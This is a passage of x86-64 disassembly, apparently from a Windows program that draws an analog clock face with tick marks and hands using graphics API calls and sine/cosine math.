  401f76:	41 5c                	pop    %r12
  401f78:	41 5d                	pop    %r13
  401f7a:	41 5e                	pop    %r14
  401f7c:	41 5f                	pop    %r15
  401f7e:	c3                   	ret
  401f7f:	90                   	nop
  401f80:	48 8b 44 24 58       	mov    0x58(%rsp),%rax
  401f85:	eb b3                	jmp    0x401f3a
  401f87:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  401f8e:	00 00 
  401f90:	41 57                	push   %r15
  401f92:	41 56                	push   %r14
  401f94:	41 55                	push   %r13
  401f96:	41 54                	push   %r12
  401f98:	55                   	push   %rbp
  401f99:	57                   	push   %rdi
  401f9a:	56                   	push   %rsi
  401f9b:	53                   	push   %rbx
  401f9c:	48 81 ec 68 01 00 00 	sub    $0x168,%rsp
  401fa3:	0f 29 b4 24 00 01 00 	movaps %xmm6,0x100(%rsp)
  401faa:	00 
  401fab:	0f 29 bc 24 10 01 00 	movaps %xmm7,0x110(%rsp)
  401fb2:	00 
  401fb3:	44 0f 29 84 24 20 01 	movaps %xmm8,0x120(%rsp)
  401fba:	00 00 
  401fbc:	44 0f 29 8c 24 30 01 	movaps %xmm9,0x130(%rsp)
  401fc3:	00 00 
  401fc5:	44 0f 29 94 24 40 01 	movaps %xmm10,0x140(%rsp)
  401fcc:	00 00 
  401fce:	44 0f 29 9c 24 50 01 	movaps %xmm11,0x150(%rsp)
  401fd5:	00 00 
  401fd7:	41 b8 a5 2a 2a 00    	mov    $0x2a2aa5,%r8d
  401fdd:	ba 28 00 00 00       	mov    $0x28,%edx
  401fe2:	45 31 e4             	xor    %r12d,%r12d
  401fe5:	48 89 ce             	mov    %rcx,%rsi
  401fe8:	31 c9                	xor    %ecx,%ecx
  401fea:	48 8d bc 24 f4 00 00 	lea    0xf4(%rsp),%rdi
  401ff1:	00 
  401ff2:	48 8b 05 ff c4 0d 00 	mov    0xdc4ff(%rip),%rax        # 0x4de4f8
  401ff9:	48 89 84 24 80 00 00 	mov    %rax,0x80(%rsp)
  402000:	00 
  402001:	ff d0                	call   *%rax
  402003:	4c 8b 05 36 c5 0d 00 	mov    0xdc536(%rip),%r8        # 0x4de540
  40200a:	48 89 c2             	mov    %rax,%rdx
  40200d:	48 89 f1             	mov    %rsi,%rcx
  402010:	48 89 84 24 90 00 00 	mov    %rax,0x90(%rsp)
  402017:	00 
  402018:	4c 89 84 24 88 00 00 	mov    %r8,0x88(%rsp)
  40201f:	00 
  402020:	41 ff d0             	call   *%r8
  402023:	48 89 84 24 c0 00 00 	mov    %rax,0xc0(%rsp)
  40202a:	00 
  40202b:	8b 05 47 92 00 00    	mov    0x9247(%rip),%eax        # 0x40b278
  402031:	8b 0d 45 92 00 00    	mov    0x9245(%rip),%ecx        # 0x40b27c
  402037:	48 8b 1d da c4 0d 00 	mov    0xdc4da(%rip),%rbx        # 0x4de518
  40203e:	44 8d 80 be 00 00 00 	lea    0xbe(%rax),%r8d
  402045:	8d 91 42 ff ff ff    	lea    -0xbe(%rcx),%edx
  40204b:	44 8d 89 be 00 00 00 	lea    0xbe(%rcx),%r9d
  402052:	48 89 f1             	mov    %rsi,%rcx
  402055:	44 89 44 24 20       	mov    %r8d,0x20(%rsp)
  40205a:	44 8d 80 42 ff ff ff 	lea    -0xbe(%rax),%r8d
  402061:	ff d3                	call   *%rbx
  402063:	4c 8b 8c 24 80 00 00 	mov    0x80(%rsp),%r9
  40206a:	00 
  40206b:	45 31 c0             	xor    %r8d,%r8d
  40206e:	ba 03 00 00 00       	mov    $0x3,%edx
  402073:	31 c9                	xor    %ecx,%ecx
  402075:	41 ff d1             	call   *%r9
  402078:	48 89 f1             	mov    %rsi,%rcx
  40207b:	48 89 c2             	mov    %rax,%rdx
  40207e:	4c 8b 84 24 88 00 00 	mov    0x88(%rsp),%r8
  402085:	00 
  402086:	48 89 84 24 98 00 00 	mov    %rax,0x98(%rsp)
  40208d:	00 
  40208e:	41 ff d0             	call   *%r8
  402091:	8b 05 e1 91 00 00    	mov    0x91e1(%rip),%eax        # 0x40b278
  402097:	8b 0d df 91 00 00    	mov    0x91df(%rip),%ecx        # 0x40b27c
  40209d:	44 8d 80 b4 00 00 00 	lea    0xb4(%rax),%r8d
  4020a4:	8d 91 4c ff ff ff    	lea    -0xb4(%rcx),%edx
  4020aa:	44 8d 89 b4 00 00 00 	lea    0xb4(%rcx),%r9d
  4020b1:	48 89 f1             	mov    %rsi,%rcx
  4020b4:	44 89 44 24 20       	mov    %r8d,0x20(%rsp)
  4020b9:	44 8d 80 4c ff ff ff 	lea    -0xb4(%rax),%r8d
  4020c0:	ff d3                	call   *%rbx
  4020c2:	4c 8b 8c 24 80 00 00 	mov    0x80(%rsp),%r9
  4020c9:	00 
  4020ca:	41 b8 c8 c8 c8 00    	mov    $0xc8c8c8,%r8d
  4020d0:	ba 03 00 00 00       	mov    $0x3,%edx
  4020d5:	31 c9                	xor    %ecx,%ecx
  4020d7:	41 ff d1             	call   *%r9
  4020da:	48 89 f1             	mov    %rsi,%rcx
  4020dd:	48 89 c2             	mov    %rax,%rdx
  4020e0:	4c 8b 84 24 88 00 00 	mov    0x88(%rsp),%r8
  4020e7:	00 
  4020e8:	48 89 84 24 a0 00 00 	mov    %rax,0xa0(%rsp)
  4020ef:	00 
  4020f0:	41 ff d0             	call   *%r8
  4020f3:	8b 05 7f 91 00 00    	mov    0x917f(%rip),%eax        # 0x40b278
  4020f9:	8b 0d 7d 91 00 00    	mov    0x917d(%rip),%ecx        # 0x40b27c
  4020ff:	44 8d 40 0a          	lea    0xa(%rax),%r8d
  402103:	8d 51 f6             	lea    -0xa(%rcx),%edx
  402106:	44 8d 49 0a          	lea    0xa(%rcx),%r9d
  40210a:	48 89 f1             	mov    %rsi,%rcx
  40210d:	44 89 44 24 20       	mov    %r8d,0x20(%rsp)
  402112:	44 8d 40 f6          	lea    -0xa(%rax),%r8d
  402116:	ff d3                	call   *%rbx
  402118:	4c 8d 0d d3 71 0d 00 	lea    0xd71d3(%rip),%r9        # 0x4d92f2
  40211f:	45 31 c0             	xor    %r8d,%r8d
  402122:	ba 14 00 00 00       	mov    $0x14,%edx
  402127:	b9 2d 00 00 00       	mov    $0x2d,%ecx
  40212c:	c7 44 24 60 00 00 00 	movl   $0x0,0x60(%rsp)
  402133:	00 
  402134:	c7 44 24 58 00 00 00 	movl   $0x0,0x58(%rsp)
  40213b:	00 
  40213c:	4c 89 4c 24 68       	mov    %r9,0x68(%rsp)
  402141:	c7 44 24 50 01 00 00 	movl   $0x1,0x50(%rsp)
  402148:	00 
  402149:	45 31 c9             	xor    %r9d,%r9d
  40214c:	c7 44 24 48 02 00 00 	movl   $0x2,0x48(%rsp)
  402153:	00 
  402154:	c7 44 24 40 00 00 00 	movl   $0x0,0x40(%rsp)
  40215b:	00 
  40215c:	48 8d 9c 24 d0 00 00 	lea    0xd0(%rsp),%rbx
  402163:	00 
  402164:	c7 44 24 38 00 00 00 	movl   $0x0,0x38(%rsp)
  40216b:	00 
  40216c:	c7 44 24 30 00 00 00 	movl   $0x0,0x30(%rsp)
  402173:	00 
  402174:	c7 44 24 28 00 00 00 	movl   $0x0,0x28(%rsp)
  40217b:	00 
  40217c:	c7 44 24 20 00 00 00 	movl   $0x0,0x20(%rsp)
  402183:	00 
  402184:	ff 15 66 c3 0d 00    	call   *0xdc366(%rip)        # 0x4de4f0
  40218a:	4c 8b 84 24 88 00 00 	mov    0x88(%rsp),%r8
  402191:	00 
  402192:	48 89 c2             	mov    %rax,%rdx
  402195:	48 89 f1             	mov    %rsi,%rcx
  402198:	48 89 84 24 a8 00 00 	mov    %rax,0xa8(%rsp)
  40219f:	00 
  4021a0:	41 ff d0             	call   *%r8
  4021a3:	ba cd 5c 5c 00       	mov    $0x5c5ccd,%edx
  4021a8:	48 89 f1             	mov    %rsi,%rcx
  4021ab:	48 89 84 24 c8 00 00 	mov    %rax,0xc8(%rsp)
  4021b2:	00 
  4021b3:	ff 15 97 c3 0d 00    	call   *0xdc397(%rip)        # 0x4de550
  4021b9:	ba 01 00 00 00       	mov    $0x1,%edx
  4021be:	48 89 f1             	mov    %rsi,%rcx
  4021c1:	ff 15 81 c3 0d 00    	call   *0xdc381(%rip)        # 0x4de548
  4021c7:	4c 8b 2d 52 c3 0d 00 	mov    0xdc352(%rip),%r13        # 0x4de520
  4021ce:	4c 8b 3d 83 c3 0d 00 	mov    0xdc383(%rip),%r15        # 0x4de558
  4021d5:	41 b8 0c 00 00 00    	mov    $0xc,%r8d
  4021db:	f2 44 0f 10 15 a4 73 	movsd  0xd73a4(%rip),%xmm10        # 0x4d9588
  4021e2:	0d 00 
  4021e4:	c7 84 24 f0 00 00 00 	movl   $0xc,0xf0(%rsp)
  4021eb:	0c 00 00 00 
  4021ef:	f2 44 0f 10 1d 98 73 	movsd  0xd7398(%rip),%xmm11        # 0x4d9590
  4021f6:	0d 00 
  4021f8:	c7 84 24 f4 00 00 00 	movl   $0x3,0xf4(%rsp)
  4021ff:	03 00 00 00 
  402203:	f2 0f 10 3d 8d 73 0d 	movsd  0xd738d(%rip),%xmm7        # 0x4d9598
  40220a:	00 
  40220b:	c7 84 24 f8 00 00 00 	movl   $0x6,0xf8(%rsp)
  402212:	06 00 00 00 
  402216:	c7 84 24 fc 00 00 00 	movl   $0x9,0xfc(%rsp)
  40221d:	09 00 00 00 
  402221:	48 8d 15 d3 70 0d 00 	lea    0xd70d3(%rip),%rdx        # 0x4d92fb
  402228:	48 89 d9             	mov    %rbx,%rcx
  40222b:	e8 b8 7d 00 00       	call   0x409fe8
  402230:	49 89 d8             	mov    %rbx,%r8
  402233:	41 8b 10             	mov    (%r8),%edx
  402236:	49 83 c0 04          	add    $0x4,%r8
  40223a:	8d 82 ff fe fe fe    	lea    -0x1010101(%rdx),%eax
  402240:	f7 d2                	not    %edx
  402242:	21 d0                	and    %edx,%eax
  402244:	25 80 80 80 80       	and    $0x80808080,%eax
  402249:	74 e8                	je     0x402233
  40224b:	89 c2                	mov    %eax,%edx
  40224d:	48 89 f1             	mov    %rsi,%rcx
  402250:	4c 8d 8c 24 e0 00 00 	lea    0xe0(%rsp),%r9
  402257:	00 
  402258:	c1 ea 10             	shr    $0x10,%edx
  40225b:	a9 80 80 00 00       	test   $0x8080,%eax
  402260:	0f 44 c2             	cmove  %edx,%eax
  402263:	49 8d 50 02          	lea    0x2(%r8),%rdx
  402267:	4c 0f 44 c2          	cmove  %rdx,%r8
  40226b:	00 c0                	add    %al,%al
  40226d:	48 89 da             	mov    %rbx,%rdx
  402270:	49 83 d8 03          	sbb    $0x3,%r8
  402274:	41 29 d8             	sub    %ebx,%r8d
  402277:	41 ff d5             	call   *%r13
  40227a:	f2 41 0f 2a f4       	cvtsi2sd %r12d,%xmm6
  40227f:	f2 41 0f 59 f2       	mulsd  %xmm10,%xmm6
  402284:	f2 41 0f 5e f3       	divsd  %xmm11,%xmm6
  402289:	66 0f 28 c6          	movapd %xmm6,%xmm0
  40228d:	e8 be 2f 00 00       	call   0x405250
  402292:	66 44 0f 28 c0       	movapd %xmm0,%xmm8
  402297:	66 0f 28 c6          	movapd %xmm6,%xmm0
  40229b:	e8 c0 30 00 00       	call   0x405360
  4022a0:	48 89 d9             	mov    %rbx,%rcx
  4022a3:	8b 11                	mov    (%rcx),%edx
  4022a5:	48 83 c1 04          	add    $0x4,%rcx
  4022a9:	8d 82 ff fe fe fe    	lea    -0x1010101(%rdx),%eax
  4022af:	f7 d2                	not    %edx
  4022b1:	21 d0                	and    %edx,%eax
  4022b3:	25 80 80 80 80       	and    $0x80808080,%eax
  4022b8:	74 e9                	je     0x4022a3
  4022ba:	89 c2                	mov    %eax,%edx
  4022bc:	f2 0f 59 c7          	mulsd  %xmm7,%xmm0
  4022c0:	44 8b 05 b1 8f 00 00 	mov    0x8fb1(%rip),%r8d        # 0x40b278
  4022c7:	c1 ea 10             	shr    $0x10,%edx
  4022ca:	a9 80 80 00 00       	test   $0x8080,%eax
  4022cf:	f2 44 0f 59 c7       	mulsd  %xmm7,%xmm8
  4022d4:	0f 44 c2             	cmove  %edx,%eax
  4022d7:	48 8d 51 02          	lea    0x2(%rcx),%rdx
  4022db:	44 8b 8c 24 e0 00 00 	mov    0xe0(%rsp),%r9d
  4022e2:	00 
  4022e3:	48 0f 44 ca          	cmove  %rdx,%rcx
  4022e7:	00 c0                	add    %al,%al
  4022e9:	f2 0f 2c c0          	cvttsd2si %xmm0,%eax
  4022ed:	48 83 d9 03          	sbb    $0x3,%rcx
  4022f1:	45 89 ca             	mov    %r9d,%r10d
  4022f4:	41 c1 ea 1f          	shr    $0x1f,%r10d
  4022f8:	48 29 d9             	sub    %rbx,%rcx
  4022fb:	41 83 c4 5a          	add    $0x5a,%r12d
  4022ff:	45 01 d1             	add    %r10d,%r9d
  402302:	89 4c 24 20          	mov    %ecx,0x20(%rsp)
  402306:	48 89 f1             	mov    %rsi,%rcx
  402309:	41 d1 f9             	sar    $1,%r9d
  40230c:	41 29 c0             	sub    %eax,%r8d
  40230f:	8b 84 24 e4 00 00 00 	mov    0xe4(%rsp),%eax
  402316:	89 c2                	mov    %eax,%edx
  402318:	c1 ea 1f             	shr    $0x1f,%edx
  40231b:	01 d0                	add    %edx,%eax
  40231d:	f2 41 0f 2c d0       	cvttsd2si %xmm8,%edx
  402322:	d1 f8                	sar    $1,%eax
  402324:	41 29 c0             	sub    %eax,%r8d
  402327:	03 15 4f 8f 00 00    	add    0x8f4f(%rip),%edx        # 0x40b27c
  40232d:	44 29 ca             	sub    %r9d,%edx
  402330:	49 89 d9             	mov    %rbx,%r9
  402333:	41 ff d7             	call   *%r15
  402336:	41 81 fc 68 01 00 00 	cmp    $0x168,%r12d
  40233d:	74 0c                	je     0x40234b
  40233f:	44 8b 07             	mov    (%rdi),%r8d
  402342:	48 83 c7 04          	add    $0x4,%rdi
  402346:	e9 d6 fe ff ff       	jmp    0x402221
  40234b:	45 31 c0             	xor    %r8d,%r8d
  40234e:	ba 03 00 00 00       	mov    $0x3,%edx
  402353:	31 c9                	xor    %ecx,%ecx
  402355:	4c 8b 8c 24 80 00 00 	mov    0x80(%rsp),%r9
  40235c:	00 
  40235d:	45 31 ff             	xor    %r15d,%r15d
  402360:	41 ff d1             	call   *%r9
  402363:	48 89 f1             	mov    %rsi,%rcx
  402366:	48 89 84 24 b0 00 00 	mov    %rax,0xb0(%rsp)
  40236d:	00 
  40236e:	48 89 c2             	mov    %rax,%rdx
  402371:	4c 8b 84 24 88 00 00 	mov    0x88(%rsp),%r8
  402378:	00 
  402379:	41 ff d0             	call   *%r8
  40237c:	4c 8b 2d ad c1 0d 00 	mov    0xdc1ad(%rip),%r13        # 0x4de530
  402383:	4c 8b 25 9e c1 0d 00 	mov    0xdc19e(%rip),%r12        # 0x4de528
  40238a:	f2 44 0f 10 0d 0d 72 	movsd  0xd720d(%rip),%xmm9        # 0x4d95a0
  402391:	0d 00 
  402393:	f2 0f 10 3d 0d 72 0d 	movsd  0xd720d(%rip),%xmm7        # 0x4d95a8
  40239a:	00 
  40239b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  4023a0:	f2 41 0f 2a f7       	cvtsi2sd %r15d,%xmm6
  4023a5:	41 83 c7 1e          	add    $0x1e,%r15d
  4023a9:	f2 41 0f 59 f2       	mulsd  %xmm10,%xmm6
  4023ae:	f2 41 0f 5e f3       	divsd  %xmm11,%xmm6
  4023b3:	66 0f 28 c6          	movapd %xmm6,%xmm0
  4023b7:	e8 94 2e 00 00       	call   0x405250
  4023bc:	66 44 0f 28 c0       	movapd %xmm0,%xmm8
  4023c1:	8b 1d b1 8e 00 00    	mov    0x8eb1(%rip),%ebx        # 0x40b278
  4023c7:	66 0f 28 c6          	movapd %xmm6,%xmm0
  4023cb:	8b 3d ab 8e 00 00    	mov    0x8eab(%rip),%edi        # 0x40b27c
  4023d1:	e8 8a 2f 00 00       	call   0x405360
  4023d6:	66 41 0f 28 c8       	movapd %xmm8,%xmm1
  4023db:	f2 44 0f 59 c7       	mulsd  %xmm7,%xmm8
  4023e0:	41 89 de             	mov    %ebx,%r14d
  4023e3:	41 89 d8             	mov    %ebx,%r8d
  4023e6:	45 31 c9             	xor    %r9d,%r9d
  4023e9:	f2 41 0f 59 c9       	mulsd  %xmm9,%xmm1
  4023ee:	48 89 f1             	mov    %rsi,%rcx
  4023f1:	f2 41 0f 2c d0       	cvttsd2si %xmm8,%edx
  4023f6:	f2 0f 2c e9          	cvttsd2si %xmm1,%ebp
  4023fa:	66 0f 28 c8          	movapd %xmm0,%xmm1
  4023fe:	f2 0f 59 c7          	mulsd  %xmm7,%xmm0
  402402:	f2 41 0f 59 c9       	mulsd  %xmm9,%xmm1
  402407:	f2 0f 2c c1          	cvttsd2si %xmm1,%eax
  40240b:	01 fa                	add    %edi,%edx
  40240d:	01 fd                	add    %edi,%ebp
  40240f:	41 29 c6             	sub    %eax,%r14d
  402412:	f2 0f 2c c0          	cvttsd2si %xmm0,%eax
  402416:	41 29 c0             	sub    %eax,%r8d
  402419:	41 ff d5             	call   *%r13
  40241c:	45 89 f0             	mov    %r14d,%r8d
  40241f:	89 ea                	mov    %ebp,%edx
  402421:	48 89 f1             	mov    %rsi,%rcx
  402424:	41 ff d4             	call   *%r12
  402427:	41 81 ff 68 01 00 00 	cmp    $0x168,%r15d
  40242e:	0f 85 6c ff ff ff    	jne    0x4023a0
  402434:	45 31 c0             	xor    %r8d,%r8d
  402437:	ba 01 00 00 00       	mov    $0x1,%edx
  40243c:	31 c9                	xor    %ecx,%ecx
  40243e:	4c 8b 8c 24 80 00 00 	mov    0x80(%rsp),%r9
  402445:	00 
  402446:	41 be 06 00 00 00    	mov    $0x6,%r14d
  40244c:	31 db                	xor    %ebx,%ebx
  40244e:	41 ff d1             	call   *%r9
  402451:	41 bf 67 66 66 66    	mov    $0x66666667,%r15d
  402457:	48 89 84 24 b8 00 00 	mov    %rax,0xb8(%rsp)
  40245e:	00 
  40245f:	48 89 c2             	mov    %rax,%rdx
  402462:	48 89 f1             	mov    %rsi,%rcx
  402465:	4c 8b 84 24 88 00 00 	mov    0x88(%rsp),%r8
  40246c:	00 
  40246d:	41 ff d0             	call   *%r8
  402470:	f2 44 0f 10 0d 37 71 	movsd  0xd7137(%rip),%xmm9        # 0x4d95b0
  402477:	0d 00 
  402479:	eb 09                	jmp    0x402484
  40247b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  402480:	41 83 c6 06          	add    $0x6,%r14d
  402484:	83 c3 01             	add    $0x1,%ebx
  402487:	83 fb 3c             	cmp    $0x3c,%ebx
  40248a:	0f 84 b2 00 00 00    	je     0x402542
  402490:	89 d8                	mov    %ebx,%eax
  402492:	41 f7 ef             	imul   %r15d
  402495:	89 d8                	mov    %ebx,%eax
  402497:	c1 f8 1f             	sar    $0x1f,%eax
  40249a:	d1 fa                	sar    $1,%edx
  40249c:	29 c2                	sub    %eax,%edx
  40249e:	8d 04 92             	lea    (%rdx,%rdx,4),%eax
  4024a1:	39 c3                	cmp    %eax,%ebx
  4024a3:	74 db                	je     0x402480
  4024a5:	f2 41 0f 2a f6       	cvtsi2sd %r14d,%xmm6
  4024aa:	f2 41 0f 59 f2       	mulsd  %xmm10,%xmm6
  4024af:	f2 41 0f 5e f3       	divsd  %xmm11,%xmm6
  4024b4:	66 0f 28 c6          	movapd %xmm6,%xmm0
  4024b8:	e8 93 2d 00 00       	call   0x405250
  4024bd:	44 8b 05 b4 8d 00 00 	mov    0x8db4(%rip),%r8d        # 0x40b278
  4024c4:	66 44 0f 28 c0       	movapd %xmm0,%xmm8
  4024c9:	66 0f 28 c6          	movapd %xmm6,%xmm0
  4024cd:	8b 2d a9 8d 00 00    	mov    0x8da9(%rip),%ebp        # 0x40b27c
  4024d3:	44 89 44 24 78       	mov    %r8d,0x78(%rsp)
  4024d8:	e8 83 2e 00 00       	call   0x405360
  4024dd:	66 41 0f 28 c8       	movapd %xmm8,%xmm1
  4024e2:	44 8b 44 24 78       	mov    0x78(%rsp),%r8d
  4024e7:	f2 44 0f 59 c7       	mulsd  %xmm7,%xmm8
  4024ec:	f2 41 0f 59 c9       	mulsd  %xmm9,%xmm1
  4024f1:	45 89 c1             	mov    %r8d,%r9d
  4024f4:	f2 0f 2c f9          	cvttsd2si %xmm1,%edi
  4024f8:	66 0f 28 c8          	movapd %xmm0,%xmm1
  4024fc:	f2 0f 59 c7          	mulsd  %xmm7,%xmm0
  402500:	f2 41 0f 59 c9       	mulsd  %xmm9,%xmm1
  402505:	f2 0f 2c c8          	cvttsd2si %xmm0,%ecx
  402509:	f2 0f 2c d1          	cvttsd2si %xmm1,%edx
  40250d:	01 ef                	add    %ebp,%edi
  40250f:	41 29 c8             	sub    %ecx,%r8d
  402512:	48 89 f1             	mov    %rsi,%rcx
  402515:	41 29 d1             	sub    %edx,%r9d
  402518:	f2 41 0f 2c d0       	cvttsd2si %xmm8,%edx
  40251d:	44 89 8c 24 80 00 00 	mov    %r9d,0x80(%rsp)
  402524:	00 
  402525:	45 31 c9             	xor    %r9d,%r9d
  402528:	01 ea                	add    %ebp,%edx
  40252a:	41 ff d5             	call   *%r13
  40252d:	44 8b 84 24 80 00 00 	mov    0x80(%rsp),%r8d
  402534:	00 
  402535:	89 fa                	mov    %edi,%edx
  402537:	48 89 f1             	mov    %rsi,%rcx
  40253a:	41 ff d4             	call   *%r12
  40253d:	e9 3e ff ff ff       	jmp    0x402480
  402542:	4c 8b 84 24 88 00 00 	mov    0x88(%rsp),%r8
  402549:	00 
  40254a:	48 8b 94 24 c0 00 00 	mov    0xc0(%rsp),%rdx
  402551:	00 
  402552:	48 89 f1             	mov    %rsi,%rcx
  402555:	41 ff d0             	call   *%r8
  402558:	48 8b 94 24 c8 00 00 	mov    0xc8(%rsp),%rdx
  40255f:	00 
  402560:	4c 8b 8c 24 88 00 00 	mov    0x88(%rsp),%r9
  402567:	00 
  402568:	48 89 f1             	mov    %rsi,%rcx
  40256b:	41 ff d1             	call   *%r9
  40256e:	48 8b 1d 9b bf 0d 00 	mov    0xdbf9b(%rip),%rbx        # 0x4de510
  402575:	48 8b 8c 24 90 00 00 	mov    0x90(%rsp),%rcx
  40257c:	00 
  40257d:	ff d3                	call   *%rbx
  40257f:	48 8b 8c 24 98 00 00 	mov    0x98(%rsp),%rcx
  402586:	00 
  402587:	ff d3                	call   *%rbx
  402589:	48 8b 8c 24 a0 00 00 	mov    0xa0(%rsp),%rcx
  402590:	00 
  402591:	ff d3                	call   *%rbx
  402593:	48 8b 8c 24 b0 00 00 	mov    0xb0(%rsp),%rcx
  40259a:	00 
  40259b:	ff d3                	call   *%rbx
  40259d:	48 8b 8c 24 b8 00 00 	mov    0xb8(%rsp),%rcx
  4025a4:	00 
  4025a5:	ff d3                	call   *%rbx
  4025a7:	48 8b 8c 24 a8 00 00 	mov    0xa8(%rsp),%rcx
  4025ae:	00 
  4025af:	ff d3                	call   *%rbx
  4025b1:	90                   	nop
  4025b2:	0f 28 b4 24 00 01 00 	movaps 0x100(%rsp),%xmm6
  4025b9:	00 
  4025ba:	0f 28 bc 24 10 01 00 	movaps 0x110(%rsp),%xmm7
  4025c1:	00 
  4025c2:	44 0f 28 84 24 20 01 	movaps 0x120(%rsp),%xmm8
  4025c9:	00 00 
  4025cb:	44 0f 28 8c 24 30 01 	movaps 0x130(%rsp),%xmm9
  4025d2:	00 00 
  4025d4:	44 0f 28 94 24 40 01 	movaps 0x140(%rsp),%xmm10
  4025db:	00 00 
  4025dd:	44 0f 28 9c 24 50 01 	movaps 0x150(%rsp),%xmm11
  4025e4:	00 00 
  4025e6:	48 81 c4 68 01 00 00 	add    $0x168,%rsp
  4025ed:	5b                   	pop    %rbx
  4025ee:	5e                   	pop    %rsi
  4025ef:	5f                   	pop    %rdi
  4025f0:	5d                   	pop    %rbp
  4025f1:	41 5c                	pop    %r12
  4025f3:	41 5d                	pop    %r13
  4025f5:	41 5e                	pop    %r14
  4025f7:	41 5f                	pop    %r15
  4025f9:	c3                   	ret
  4025fa:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  402600:	41 57                	push   %r15
  402602:	41 56                	push   %r14
  402604:	41 55                	push   %r13
  402606:	41 54                	push   %r12
  402608:	55                   	push   %rbp
  402609:	57                   	push   %rdi
  40260a:	56                   	push   %rsi
  40260b:	53                   	push   %rbx
  40260c:	48 81 ec 88 00 00 00 	sub    $0x88,%rsp
  402613:	0f 29 74 24 30       	movaps %xmm6,0x30(%rsp)
  402618:	0f 29 7c 24 40       	movaps %xmm7,0x40(%rsp)
  40261d:	44 0f 29 44 24 50    	movaps %xmm8,0x50(%rsp)
  402623:	44 0f 29 4c 24 60    	movaps %xmm9,0x60(%rsp)
  402629:	44 0f 29 54 24 70    	movaps %xmm10,0x70(%rsp)
  40262f:	f2 0f 2a 05 05 9a 0d 	cvtsi2sdl 0xd9a05(%rip),%xmm0        # 0x4dc03c
  402636:	00 
  402637:	ba ab aa aa 2a       	mov    $0x2aaaaaab,%edx
  40263c:	45 31 c0             	xor    %r8d,%r8d
  40263f:	48 89 cb             	mov    %rcx,%rbx
  402642:	8b 0d f8 99 0d 00    	mov    0xd99f8(%rip),%ecx        # 0x4dc040
  402648:	f2 44 0f 10 15 67 6f 	movsd  0xd6f67(%rip),%xmm10        # 0x4d95b8
  40264f:	0d 00 
  402651:	f2 44 0f 10 05 2e 6f 	movsd  0xd6f2e(%rip),%xmm8        # 0x4d9588
  402658:	0d 00 
  40265a:	4c 8b 25 97 be 0d 00 	mov    0xdbe97(%rip),%r12        # 0x4de4f8
  402661:	f2 41 0f 5e c2       	divsd  %xmm10,%xmm0
  402666:	89 c8                	mov    %ecx,%eax
  402668:	f7 ea                	imul   %edx
  40266a:	89 c8                	mov    %ecx,%eax
  40266c:	c1 f8 1f             	sar    $0x1f,%eax
  40266f:	d1 fa                	sar    $1,%edx
  402671:	29 c2                	sub    %eax,%edx
  402673:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
  402676:	ba 0a 00 00 00       	mov    $0xa,%edx
  40267b:	c1 e0 02             	shl    $0x2,%eax
  40267e:	29 c1                	sub    %eax,%ecx
  402680:	f2 0f 2a f1          	cvtsi2sd %ecx,%xmm6
  402684:	31 c9                	xor    %ecx,%ecx
  402686:	f2 0f 10 3d 02 6f 0d 	movsd  0xd6f02(%rip),%xmm7        # 0x4d9590
  40268d:	00 
  40268e:	f2 0f 58 f0          	addsd  %xmm0,%xmm6
  402692:	f2 0f 2a 05 9e 99 0d 	cvtsi2sdl 0xd999e(%rip),%xmm0        # 0x4dc038
  402699:	00 
  40269a:	f2 0f 5e 05 1e 6f 0d 	divsd  0xd6f1e(%rip),%xmm0        # 0x4d95c0
  4026a1:	00 
  4026a2:	f2 0f 58 f0          	addsd  %xmm0,%xmm6
  4026a6:	f2 0f 59 35 1a 6f 0d 	mulsd  0xd6f1a(%rip),%xmm6        # 0x4d95c8
  4026ad:	00 
  4026ae:	41 ff d4             	call   *%r12
  4026b1:	48 8b 35 88 be 0d 00 	mov    0xdbe88(%rip),%rsi        # 0x4de540
  4026b8:	49 89 c6             	mov    %rax,%r14
  4026bb:	48 89 d9             	mov    %rbx,%rcx
  4026be:	48 89 c2             	mov    %rax,%rdx
  4026c1:	ff d6                	call   *%rsi
  4026c3:	45 31 c9             	xor    %r9d,%r9d
  4026c6:	48 89 d9             	mov    %rbx,%rcx
  4026c9:	48 8b 2d 60 be 0d 00 	mov    0xdbe60(%rip),%rbp        # 0x4de530
  4026d0:	f2 41 0f 59 f0       	mulsd  %xmm8,%xmm6
  4026d5:	44 8b 05 9c 8b 00 00 	mov    0x8b9c(%rip),%r8d        # 0x40b278
  4026dc:	8b 15 9a 8b 00 00    	mov    0x8b9a(%rip),%edx        # 0x40b27c
  4026e2:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
  4026e7:	ff d5                	call   *%rbp
  4026e9:	f2 0f 5e f7          	divsd  %xmm7,%xmm6
  4026ed:	66 0f 28 c6          	movapd %xmm6,%xmm0
  4026f1:	e8 6a 2c 00 00       	call   0x405360
  4026f6:	66 44 0f 28 c8       	movapd %xmm0,%xmm9
  4026fb:	66 0f 28 c6          	movapd %xmm6,%xmm0
  4026ff:	e8 4c 2b 00 00       	call   0x405250
  402704:	66 41 0f 28 c9       	movapd %xmm9,%xmm1
  402709:	44 8b 05 68 8b 00 00 	mov    0x8b68(%rip),%r8d        # 0x40b278
  402710:	66 0f 28 f0          	movapd %xmm0,%xmm6
  402714:	48 8b 3d 0d be 0d 00 	mov    0xdbe0d(%rip),%rdi        # 0x4de528
  40271b:	f2 0f 10 05 ad 6e 0d 	movsd  0xd6ead(%rip),%xmm0        # 0x4d95d0
  402722:	00 
  402723:	48 89 d9             	mov    %rbx,%rcx
  402726:	f2 0f 59 c8          	mulsd  %xmm0,%xmm1
  40272a:	f2 0f 59 c6          	mulsd  %xmm6,%xmm0
  40272e:	f2 0f 2c c1          	cvttsd2si %xmm1,%eax
  402732:	f2 0f 2c d0          	cvttsd2si %xmm0,%edx
  402736:	03 15 40 8b 00 00    	add    0x8b40(%rip),%edx        # 0x40b27c
  40273c:	41 29 c0             	sub    %eax,%r8d
  40273f:	ff d7                	call   *%rdi
  402741:	41 b8 c8 c8 c8 00    	mov    $0xc8c8c8,%r8d
  402747:	31 c9                	xor    %ecx,%ecx
  402749:	ba 03 00 00 00       	mov    $0x3,%edx
  40274e:	41 ff d4             	call   *%r12
  402751:	48 89 d9             	mov    %rbx,%rcx
  402754:	49 89 c7             	mov    %rax,%r15
  402757:	48 89 c2             	mov    %rax,%rdx
  40275a:	ff d6                	call   *%rsi
